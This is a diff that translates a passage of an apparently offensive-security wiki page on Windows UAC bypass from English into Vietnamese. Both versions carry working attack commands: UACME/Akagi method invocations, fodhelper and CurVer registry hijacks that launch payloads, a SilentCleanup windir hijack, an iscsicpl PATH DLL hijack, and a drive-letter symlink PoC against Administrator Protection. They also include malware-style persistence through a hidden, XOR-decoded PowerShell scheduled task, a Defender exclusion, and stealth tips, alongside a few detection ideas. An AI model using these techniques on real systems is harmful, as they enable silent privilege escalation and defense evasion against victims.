+- `UACME` vẫn là danh mục công khai tốt nhất để xác định chính xác build tương ứng với một bypass. Phiên bản 3.7.1 bổ sung các phương thức 83–85, trong khi bản phát hành trước đó kiểm thử lại các phương thức hiện có trên **Windows 11 25H2**; hãy kiểm tra lại bảng phương thức và ghi chú phát hành thay vì cho rằng PoC cũ vẫn áp dụng nguyên trạng.<sup>[[3]](#references)[[9]](#references)</sup>
 
-### Always Notify-capable WNF/UIAccess chains (UACME 3.7.1)
+### Các chuỗi WNF/UIAccess tương thích với Always Notify (UACME 3.7.1)
 
-`Always Notify` does not eliminate every UAC bypass. UACME 3.7.1 implements three new x64 methods that combine user-controlled environment/protocol state with elevated scheduled-task or UIAccess behavior, and marks all of them `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>
+`Always Notify` không loại bỏ mọi UAC bypass. UACME 3.7.1 triển khai ba phương thức x64 mới, kết hợp trạng thái môi trường/giao thức do người dùng kiểm soát với hành vi của scheduled task hoặc UIAccess được nâng quyền, đồng thời đánh dấu cả ba là `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>
 
-- **83 — UnifiedConsent:** redirect `SystemRoot` so the WNF-triggered `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` makes elevated `taskhostw.exe` side-load `unifiedconsent.dll`. UACME tracks it from Windows 10 build 19041.
-- **84 — TabTip:** use the same environment-variable primitive against UIAccess `TabTip.exe`, which loads `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll`, or `rsaenh.dll` depending on the build, then pivot from the resulting high-integrity UIAccess context. UACME tracks it from Windows 8.1 / Server 2016.
-- **85 — Narrator:** hijack the per-user `feedback-hub` protocol, drive Narrator with `Alt+CapsLock+F`, then launch a writable copy of `osk.exe` that side-loads `OskSupport.dll`. This requires an interactive desktop and is tracked from Windows 10 1809 / Server 2019.
+- **83 — UnifiedConsent:** chuyển hướng `SystemRoot` để tác vụ `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` được kích hoạt qua WNF khiến `taskhostw.exe` chạy với quyền nâng cao side-load `unifiedconsent.dll`. UACME theo dõi phương thức này từ Windows 10 build 19041.
+- **84 — TabTip:** dùng cùng primitive biến môi trường với UIAccess `TabTip.exe`, tiến trình này tải `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` hoặc `rsaenh.dll` tùy theo build, rồi pivot từ ngữ cảnh UIAccess có mức toàn vẹn cao vừa tạo ra. UACME theo dõi phương thức này từ Windows 8.1 / Server 2016.
+- **85 — Narrator:** chiếm quyền protocol `feedback-hub` theo từng người dùng, điều khiển Narrator bằng `Alt+CapsLock+F`, rồi khởi chạy một bản sao `osk.exe` có thể ghi để side-load `OskSupport.dll`. Phương thức này yêu cầu desktop tương tác và được theo dõi từ Windows 10 1809 / Server 2019.
 
-After building the payload units and Akagi as documented by UACME, invoke the matching method number (the optional command defaults to `cmd.exe`):
+Sau khi build các payload unit và Akagi theo tài liệu của UACME, gọi số phương thức tương ứng (lệnh tùy chọn mặc định là `cmd.exe`):
 
 ```cmd
 Akagi64.exe 83 C:\Windows\System32\cmd.exe
@@ -229,19 +229,19 @@ Akagi64.exe 84 C:\Windows\System32\cmd.exe
 Akagi64.exe 85 C:\Windows\System32\cmd.exe
 ```
 
-Methods 84 and 85 depend on UIAccess/desktop interaction, so do not expect them to work unchanged from Session 0 or a non-interactive service shell. All three manipulate environment/protocol state and stage DLLs; inspect the implementation and remove those artifacts after testing.<sup>[[3]](#references)[[9]](#references)</sup>
+Methods 84 và 85 phụ thuộc vào UIAccess/tương tác với desktop, vì vậy đừng kỳ vọng chúng hoạt động nguyên trạng từ Session 0 hoặc shell dịch vụ không tương tác. Cả ba đều thao tác với trạng thái môi trường/giao thức và chuẩn bị DLL; hãy kiểm tra implementation và xóa các artifact đó sau khi kiểm thử.<sup>[[3]](#references)[[9]](#references)</sup>
 
 ### UAC Bypass – fodhelper.exe (Registry hijack)
 
-The trusted binary `fodhelper.exe` is auto-elevated on modern Windows. When launched, it queries the per-user registry path below without validating the `DelegateExecute` verb. Planting a command there allows a Medium Integrity process (user is in Administrators) to spawn a High Integrity process without a UAC prompt.
+Binary đáng tin cậy `fodhelper.exe` được auto-elevate trên các phiên bản Windows hiện đại. Khi được khởi chạy, nó truy vấn đường dẫn registry theo người dùng bên dưới mà không xác thực verb `DelegateExecute`. Đặt một lệnh tại đó cho phép một process có Medium Integrity (người dùng thuộc nhóm Administrators) khởi chạy process có High Integrity mà không hiện lời nhắc UAC.
 
-Registry path queried by fodhelper:
+Đường dẫn registry được fodhelper truy vấn:
 ```text
 HKCU\Software\Classes\ms-settings\Shell\Open\command
 ```
 
 <details>
-<summary>PowerShell steps (set your payload, then trigger)</summary>
+<summary>Các bước PowerShell (đặt payload của bạn, rồi kích hoạt)</summary>
 
 ```powershell
 # Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
@@ -263,14 +263,14 @@ Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Forc
 ```
 
 </details>
-Notes:
-- Works when the current user is a member of Administrators and UAC level is default/lenient (not Always Notify with extra restrictions).
-- Use the `sysnative` path to start a 64-bit PowerShell from a 32-bit process on 64-bit Windows.
-- Payload can be any command (PowerShell, cmd, or an EXE path). Avoid prompting UIs for stealth.
+Lưu ý:
+- Hoạt động khi người dùng hiện tại là thành viên của Administrators và mức UAC là mặc định/dễ dãi (không phải Always Notify kèm các hạn chế bổ sung).
+- Dùng đường dẫn `sysnative` để khởi chạy PowerShell 64-bit từ tiến trình 32-bit trên Windows 64-bit.
+- Payload có thể là bất kỳ lệnh nào (PowerShell, cmd hoặc đường dẫn EXE). Tránh các giao diện nhắc xác nhận để hoạt động kín đáo.
 
-#### CurVer/extension hijack variant (HKCU only)
+#### Biến thể chiếm quyền CurVer/extension (chỉ HKCU)
 
-Recent samples abusing `fodhelper.exe` avoid `DelegateExecute` and instead **redirect the `ms-settings` ProgID** via the per-user `CurVer` value. The auto-elevated binary still resolves the handler under `HKCU`, so no admin token is needed to plant the keys:<sup>[[5]](#references)</sup>
+Các mẫu gần đây lạm dụng `fodhelper.exe` tránh dùng `DelegateExecute`, thay vào đó **chuyển hướng ProgID `ms-settings`** thông qua giá trị `CurVer` theo người dùng. Binary tự động nâng quyền vẫn phân giải handler trong `HKCU`, nên không cần token admin để tạo các key:<sup>[[5]](#references)</sup>
 
 ```powershell
 # Point ms-settings to a custom extension (.thm) and map that extension to our payload
@@ -281,17 +281,17 @@ Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Valu
 Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
 ```
 
-Once elevated, malware commonly **disables future prompts** by setting `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` to `0`, then performs additional defense evasion (e.g., `Add-MpPreference -ExclusionPath C:\ProgramData`) and recreates persistence to run as high integrity. A typical persistence task stores an **XOR-encrypted PowerShell script** on disk and decodes/executes it in-memory each hour:<sup>[[5]](#references)</sup>
+Sau khi được nâng quyền, malware thường **vô hiệu hóa các lời nhắc sau này** bằng cách đặt `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` thành `0`, sau đó thực hiện thêm các thao tác né tránh phòng thủ (ví dụ: `Add-MpPreference -ExclusionPath C:\ProgramData`) và tạo lại cơ chế persistence để chạy với mức toàn vẹn cao. Một tác vụ persistence điển hình lưu **script PowerShell được mã hóa XOR** trên đĩa rồi giải mã và thực thi trong bộ nhớ mỗi giờ:<sup>[[5]](#references)</sup>
 
 ```powershell
 schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
 ```
 
-This variant still cleans up the dropper and leaves only the staged payloads, making detection rely on monitoring the **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion creation, or scheduled tasks that in-memory decrypt PowerShell.<sup>[[5]](#references)</sup>
+Biến thể này vẫn dọn sạch dropper và chỉ để lại các payload đã được staging, khiến việc phát hiện phụ thuộc vào giám sát **`CurVer` hijack**, hành vi can thiệp `ConsentPromptBehaviorAdmin`, việc tạo exclusion trong Defender hoặc các scheduled task giải mã PowerShell trong bộ nhớ.<sup>[[5]](#references)</sup>
 
-### UAC bypass via `SilentCleanup` task (`HKCU\Environment\windir`)
+### Bypass UAC qua task `SilentCleanup` (`HKCU\Environment\windir`)
 
-`SilentCleanup` launches `cleanmgr.exe` with highest privileges and expands `%windir%` from the user environment. If you control `HKCU\Environment\windir`, you can redirect that expansion to an arbitrary command and get high integrity without a consent dialog.<sup>[[8]](#references)</sup> This method is still worth testing on recent builds because UACME keeps the technique active and recent issue tracking shows Windows 11 24H2 may only require small quoting adjustments.<sup>[[3]](#references)</sup>
+`SilentCleanup` khởi chạy `cleanmgr.exe` với quyền cao nhất và mở rộng `%windir%` từ môi trường của người dùng. Nếu kiểm soát được `HKCU\Environment\windir`, bạn có thể chuyển hướng việc mở rộng đó sang một lệnh tùy ý và đạt mức toàn vẹn cao mà không cần hộp thoại xác nhận.<sup>[[8]](#references)</sup> Phương pháp này vẫn đáng để kiểm thử trên các bản dựng gần đây vì UACME vẫn duy trì kỹ thuật này, và theo dõi các issue gần đây cho thấy Windows 11 24H2 có thể chỉ cần điều chỉnh nhỏ về dấu ngoặc kép.<sup>[[3]](#references)</sup>
 
 ```cmd
 reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
@@ -299,53 +299,53 @@ schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
 reg delete "HKCU\Environment" /v windir /f
 ```
 
-If the task quotes the path on that build, retry with the payload ending in a quote (for example `cmd.exe"`). Always clean up `HKCU\Environment\windir` after testing.
+Nếu tác vụ trích dẫn đường dẫn trên bản build đó, hãy thử lại với payload kết thúc bằng dấu ngoặc kép (ví dụ `cmd.exe"`). Luôn dọn sạch `HKCU\Environment\windir` sau khi kiểm thử.
 
-#### More UAC bypass
+#### Thêm các cách bypass UAC
 
-Many classic UAC bypasses that abuse UI flows, COM objects, or desktop interaction require a **full interactive session** with the victim; a common `nc.exe` shell or a service running in **Session 0** is often not enough.
+Nhiều cách bypass UAC cổ điển khai thác luồng giao diện, COM object hoặc tương tác với desktop đòi hỏi phải có **phiên tương tác đầy đủ** với nạn nhân; shell `nc.exe` thông thường hoặc dịch vụ chạy trong **Session 0** thường là chưa đủ.
 
-You can often solve that using a **meterpreter** session. Migrate to a **process** that has the **Session** value equal to **1**:
+Bạn thường có thể giải quyết việc này bằng một phiên **meterpreter**. Migrate sang một **process** có giá trị **Session** bằng **1**:
 
-![Point ms-settings to a custom extension (.thm) and map that extension to our payload - More UAC bypass: You can get using a meterpreter session. Migrate to a process that has the Session...](<../../images/image (863).png>)
+![Trỏ ms-settings đến một extension tùy chỉnh (.thm) và ánh xạ extension đó đến payload của chúng ta - Thêm các cách bypass UAC: Có thể thực hiện bằng phiên meterpreter. Migrate sang một process có Session...](<../../images/image (863).png>)
 
-(_explorer.exe_ should works)
+(_explorer.exe_ sẽ hoạt động)
 
-### UAC Bypass with GUI
+### Bypass UAC bằng GUI
 
-If you have access to a **GUI you can just accept the UAC prompt** when it appears; you do not really need a technical bypass. Therefore, obtaining a GUI session is often enough to bypass the practical friction added by UAC.
+Nếu bạn có quyền truy cập **GUI, bạn có thể chỉ cần chấp nhận lời nhắc UAC** khi nó xuất hiện; thực ra bạn không cần bypass kỹ thuật. Vì vậy, có được một phiên GUI thường là đủ để vượt qua trở ngại thực tế do UAC tạo ra.
 
-Moreover, if you get a GUI session that someone was using (potentially via RDP) there are **some tools that will be running as administrator** from where you could **run** a **cmd** for example **as admin** directly without being prompted again by UAC like [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). This might be a bit more **stealthy**.
+Ngoài ra, nếu bạn có được phiên GUI mà ai đó đang sử dụng (có thể qua RDP), sẽ có **một số công cụ đang chạy với quyền administrator** mà bạn có thể dùng để **chạy** chẳng hạn như một **cmd** trực tiếp **với quyền admin** mà không bị UAC nhắc lại, ví dụ [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Cách này có thể **stealthy** hơn một chút.
 
-### Noisy brute-force UAC bypass
+### Bypass UAC brute-force gây nhiều tiếng động
 
-If noise is acceptable, a tool such as [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) can repeatedly request elevation until the user accepts it.
+Nếu chấp nhận được việc tạo ra tiếng động, một công cụ như [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) có thể liên tục yêu cầu nâng quyền cho đến khi người dùng chấp nhận.
 
-### Your own bypass - Basic UAC bypass methodology
+### Tự tạo bypass - Phương pháp cơ bản để bypass UAC
 
-If you take a look at **UACME** you will notice that **many UAC bypasses abuse DLL hijacking** (often by making an elevated binary load an attacker-controlled DLL from a writable path). [Read this to learn how to find a DLL hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).
+Nếu xem **UACME**, bạn sẽ thấy rằng **nhiều cách bypass UAC khai thác DLL hijacking** (thường bằng cách khiến một binary đã được nâng quyền tải DLL do attacker kiểm soát từ một đường dẫn có thể ghi). [Đọc nội dung này để tìm hiểu cách tìm lỗ hổng DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).
 
-1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
-2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
-3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
-   1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
+1. Tìm một binary sẽ **autoelevate** (kiểm tra xem khi được thực thi, nó có chạy ở mức integrity cao hay không).
+2. Dùng procmon tìm các sự kiện "**NAME NOT FOUND**" có thể khai thác bằng **DLL Hijacking**.
+3. Có thể bạn sẽ cần **ghi** DLL vào một số **đường dẫn được bảo vệ** (như C:\Windows\System32), nơi bạn không có quyền ghi. Bạn có thể bypass việc này bằng:
+   1. **wusa.exe**: Windows 7, 8 và 8.1. Công cụ này cho phép giải nén nội dung của file CAB vào các đường dẫn được bảo vệ (vì công cụ chạy ở mức integrity cao).
    2. **IFileOperation**: Windows 10.
-4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.
+4. Chuẩn bị một **script** để sao chép DLL vào đường dẫn được bảo vệ rồi thực thi binary dễ bị tấn công và tự động nâng quyền.
 
-### Another UAC bypass technique
+### Một kỹ thuật bypass UAC khác
 
-Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** (this is more interesting if the binary searches this information inside the **HKCU**).
+Kỹ thuật này bao gồm việc theo dõi xem một **binary autoElevated** có cố **đọc** từ **registry** **tên/đường dẫn** của một **binary** hoặc **command** cần **thực thi** hay không (sẽ đáng chú ý hơn nếu binary tìm thông tin này trong **HKCU**).
 
-### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack
+### Bypass UAC qua `SysWOW64\iscsicpl.exe` + DLL hijack bằng `PATH` của user
 
-The 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` is an **auto-elevated** binary that can be abused to load `iscsiexe.dll` by search order. If you can place a malicious `iscsiexe.dll` inside a **user-writable** folder and then modify the current user `PATH` (for example via `HKCU\Environment\Path`) so that folder is searched, Windows may load the attacker DLL inside the elevated `iscsicpl.exe` process **without showing a UAC prompt**.<sup>[[1]](#references)[[6]](#references)</sup>
+`C:\Windows\SysWOW64\iscsicpl.exe` bản 32-bit là một binary **tự động nâng quyền** có thể bị khai thác để tải `iscsiexe.dll` theo thứ tự tìm kiếm. Nếu bạn có thể đặt một `iscsiexe.dll` độc hại trong thư mục **user-writable**, rồi sửa `PATH` của user hiện tại (ví dụ qua `HKCU\Environment\Path`) để thư mục đó được tìm kiếm, Windows có thể tải DLL của attacker vào process `iscsicpl.exe` đã được nâng quyền **mà không hiển thị lời nhắc UAC**.<sup>[[1]](#references)[[6]](#references)</sup>
 
-Practical notes:
-- This is useful when the current user is in **Administrators** but running at **Medium Integrity** due to UAC.
-- The **SysWOW64** copy is the relevant one for this bypass. Treat the **System32** copy as a separate binary and validate behavior independently.
-- The primitive is a combination of **auto-elevation** and **DLL search-order hijacking**, so the same ProcMon workflow used for other UAC bypasses is useful to validate the missing DLL load.
+Lưu ý thực tế:
+- Cách này hữu ích khi user hiện tại thuộc nhóm **Administrators** nhưng đang chạy ở mức **Medium Integrity** do UAC.
+- Bản sao trong **SysWOW64** là bản cần dùng cho cách bypass này. Hãy xem bản sao trong **System32** là một binary riêng và kiểm tra hành vi của nó độc lập.
+- Primitive này kết hợp **auto-elevation** và **DLL search-order hijacking**, vì vậy quy trình ProcMon tương tự các cách bypass UAC khác rất hữu ích để xác minh việc tải DLL bị thiếu.
 
-Minimal flow:
+Quy trình tối thiểu:
 
 ```cmd
 copy iscsiexe.dll %TEMP%\iscsiexe.dll
@@ -353,37 +353,37 @@ reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
 C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
 ```
 
-Detection ideas:
-- Alert on `reg add` / registry writes to `HKCU\Environment\Path` immediately followed by execution of `C:\Windows\SysWOW64\iscsicpl.exe`.
-- Hunt for `iscsiexe.dll` in **user-controlled** locations such as `%TEMP%` or `%LOCALAPPDATA%\Microsoft\WindowsApps`.
-- Correlate `iscsicpl.exe` launches with unexpected child processes or DLL loads from outside the normal Windows directories.
+Ý tưởng phát hiện:
+- Cảnh báo khi `reg add` / thao tác ghi registry vào `HKCU\Environment\Path` được theo ngay sau bởi việc thực thi `C:\Windows\SysWOW64\iscsicpl.exe`.
+- Tìm `iscsiexe.dll` ở các vị trí **do người dùng kiểm soát**, chẳng hạn `%TEMP%` hoặc `%LOCALAPPDATA%\Microsoft\WindowsApps`.
+- Đối chiếu các lần chạy `iscsicpl.exe` với tiến trình con bất thường hoặc DLL được tải từ bên ngoài các thư mục Windows thông thường.
 
-### Newer research worth checking separately
+### Nghiên cứu mới hơn cần kiểm tra riêng
 
-Some post-2024 chains no longer look like the classic `HKCU\Software\Classes` registry hijacks. For example, activation-context cache poisoning can chain a **drive remap** and **DLL redirection** to move from medium to high integrity through trusted UI / auto-elevated binaries such as `ctfmon.exe` and later targets like `fodhelper.exe`. Instead of duplicating the large PoC here, check the compact payload examples in:
+Một số chuỗi khai thác sau năm 2024 không còn giống các kỹ thuật chiếm quyền registry `HKCU\Software\Classes` kinh điển. Ví dụ, kỹ thuật đầu độc activation-context cache có thể kết hợp **drive remap** và **DLL redirection** để nâng từ integrity trung bình lên cao thông qua các binary giao diện đáng tin cậy / tự động nâng quyền như `ctfmon.exe` và các mục tiêu về sau như `fodhelper.exe`. Thay vì lặp lại PoC lớn ở đây, hãy xem các ví dụ payload ngắn gọn trong:
 
 {{#ref}}
 ../windows-local-privilege-escalation/windows-c-payloads.md
 {{#endref}}
 
-### Administrator Protection (preview) drive-letter hijack via per-logon-session DOS device map
+### Chiếm quyền drive-letter qua per-logon-session DOS device map trong Administrator Protection (preview)
 
 > [!NOTE]
-> As of August 2026, Microsoft still documents Administrator Protection as an **Insider preview**: the October 2025 rollout was reverted and is planned for a later date. Confirm that **Admin Approval Mode with Administrator protection** is actually enabled and the device has been rebooted before testing these chains; a stock 25H2 version string alone does not prove the feature is active.<sup>[[10]](#references)</sup>
+> Tính đến tháng 8 năm 2026, Microsoft vẫn ghi nhận Administrator Protection là **bản preview Insider**: đợt triển khai tháng 10 năm 2025 đã bị thu hồi và được lên kế hoạch phát hành vào một thời điểm sau đó. Hãy xác nhận **Admin Approval Mode with Administrator protection** thực sự được bật và thiết bị đã khởi động lại trước khi kiểm thử các chuỗi khai thác này; chỉ riêng chuỗi phiên bản 25H2 mặc định không chứng minh tính năng đang hoạt động.<sup>[[10]](#references)</sup>
 
-For the full `RAiLaunchAdminProcess` / UIAccess attack surface on Windows 11 25H2 preview builds, check the dedicated page:
+Để biết toàn bộ bề mặt tấn công `RAiLaunchAdminProcess` / UIAccess trên các bản dựng preview Windows 11 25H2, xem trang chuyên biệt:
 
 {{#ref}}
 ../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
 {{#endref}}
 
-Windows 11 25H2 “Administrator Protection” uses shadow-admin tokens with per-session `\Sessions\0\DosDevices/<LUID>` maps. The directory is created lazily by `SeGetTokenDeviceMap` on first `\??` resolution. If the attacker impersonates the shadow-admin token only at **SecurityIdentification**, the directory is created with the attacker as **owner** (inherits `CREATOR OWNER`), allowing drive-letter links that take precedence over `\GLOBAL??`.<sup>[[7]](#references)</sup>
+Windows 11 25H2 “Administrator Protection” sử dụng token shadow-admin với các map `\Sessions\0\DosDevices/<LUID>` riêng theo từng phiên. Thư mục này được `SeGetTokenDeviceMap` tạo theo cơ chế lazy khi lần đầu phân giải `\??`. Nếu attacker mạo danh token shadow-admin ở mức **SecurityIdentification**, thư mục được tạo với attacker là **owner** (kế thừa `CREATOR OWNER`), cho phép các liên kết drive-letter được ưu tiên hơn `\GLOBAL??`.<sup>[[7]](#references)</sup>
 
-**Steps:**
+**Các bước:**
 
-1. From a low-privileged session, call `RAiProcessRunOnce` to spawn a promptless shadow-admin `runonce.exe`.
-2. Duplicate its primary token to an **identification** token and impersonate it while opening `\??` to force creation of `\Sessions\0\DosDevices/<LUID>` under attacker ownership.
-3. Create a `C:` symlink there pointing to attacker-controlled storage; subsequent filesystem accesses in that session resolve `C:` to the attacker path, enabling DLL/file hijack without a prompt.
+1. Từ một phiên có đặc quyền thấp, gọi `RAiProcessRunOnce` để khởi chạy `runonce.exe` shadow-admin mà không hiện prompt.
+2. Sao chép token chính của tiến trình thành token **identification** và mạo danh token đó khi mở `\??` để buộc tạo `\Sessions\0\DosDevices/<LUID>` dưới quyền sở hữu của attacker.
+3. Tạo symlink `C:` tại đó trỏ đến vùng lưu trữ do attacker kiểm soát; các lần truy cập hệ thống tệp tiếp theo trong phiên đó sẽ phân giải `C:` thành đường dẫn của attacker, cho phép chiếm quyền DLL/file mà không hiện prompt.
 
 **PowerShell PoC (NtObjectManager):**
 ```powershell
@@ -396,7 +396,7 @@ $auth = Get-NtTokenId -Authentication -Token $id
 New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
 ```
 
-On preview hosts, Administrator Protection records approvals and failures as ETW events **15031** and **15032** under the `Microsoft-Windows-LUA` provider. The events include the requester SID, application path, outcome, managed administrator account, and authentication method, so repeated exploit attempts or failed UI driving are not telemetry-free.<sup>[[10]](#references)</sup>
+Trên các máy chủ preview, Administrator Protection ghi nhận các lần phê duyệt và thất bại dưới dạng sự kiện ETW **15031** và **15032** thuộc provider `Microsoft-Windows-LUA`. Các sự kiện bao gồm SID của người yêu cầu, đường dẫn ứng dụng, kết quả, tài khoản quản trị viên được quản lý và phương thức xác thực, vì vậy các lần thử khai thác lặp lại hoặc điều khiển UI thất bại đều để lại telemetry.<sup>[[10]](#references)</sup>
 
 ```cmd
 logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
@@ -409,15 +409,15 @@ logman stop AdminProtectionTrace -ets
 ## References
 
 - [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
-- [2] [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
-- [3] [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
-- [4] [WinPwnage – UAC bypass compatibility scanner and launcher](https://github.com/rootm0s/WinPwnage)
-- [5] [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
-- [6] [Check Point Research – Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
-- [7] [Project Zero – Bypassing Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
-- [8] [Sigma / Detection.FYI – Bypass UAC Using SilentCleanup Task](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
-- [9] [R41N3RZUF477 – UnifiedConsent, TabTip and Narrator Always Notify bypasses](https://github.com/hfiref0x/UACME/issues/173)
-- [10] [Microsoft Learn – Administrator protection](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
-- [11] [Google Project Zero – Calling Local Windows RPC Servers from .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
-- [12] [Kaspersky Securelist – HoneyMyte Enhances CoolClient with a Signed Windows Kernel Rootkit](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
+- [2] [Microsoft Docs – Cách hoạt động của User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
+- [3] [UACME – Bộ sưu tập kỹ thuật bypass UAC](https://github.com/hfiref0x/UACME)
+- [4] [WinPwnage – Công cụ quét khả năng tương thích và khởi chạy kỹ thuật bypass UAC](https://github.com/rootm0s/WinPwnage)
+- [5] [Checkpoint Research – KONNI sử dụng AI để tạo backdoor PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
+- [6] [Check Point Research – Chiến dịch TrueChaos: Khai thác lỗ hổng 0-day nhắm vào các mục tiêu chính phủ Đông Nam Á](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
+- [7] [Project Zero – Bypass Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
+- [8] [Sigma / Detection.FYI – Bypass UAC bằng tác vụ SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
+- [9] [R41N3RZUF477 – Các kỹ thuật bypass Always Notify bằng UnifiedConsent, TabTip và Narrator](https://github.com/hfiref0x/UACME/issues/173)
+- [10] [Microsoft Learn – Bảo vệ quản trị viên](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
+- [11] [Google Project Zero – Gọi các máy chủ RPC cục bộ của Windows từ .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
+- [12] [Kaspersky Securelist – HoneyMyte nâng cấp CoolClient bằng rootkit kernel Windows có chữ ký số](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
 {{#include ../../banners/hacktricks-training.md}}
